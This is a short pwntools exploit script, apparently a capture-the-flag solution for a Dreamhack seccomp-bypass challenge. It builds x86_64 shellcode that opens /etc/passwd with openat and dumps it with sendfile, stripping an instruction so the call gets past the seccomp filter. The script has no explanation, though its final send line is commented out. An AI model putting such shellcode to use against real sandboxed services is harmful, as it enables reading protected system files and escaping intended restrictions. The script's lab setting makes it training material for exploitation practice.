#!/usr/bin/env python3
# Name: bypass_seccomp.py
from pwn import *
context.arch = 'x86_64'
p = process('./bypass_seccomp')
# p = remote('host3.dreamhack.games', 14748)
shellcode = shellcraft.openat(0, '/etc/passwd')
shellcode += 'mov r10, 0xffff'
print(shellcraft.sendfile(1, 'rax', 0))
print("--------------")
print(shellcraft.sendfile(1, 'rax', 0).replace('xor r10d, r10d',''))
shellcode += shellcraft.sendfile(1, 'rax', 0).replace('xor r10d, r10d','')
shellcode += shellcraft.exit(0)
# p.sendline(asm(shellcode))
p.interactive()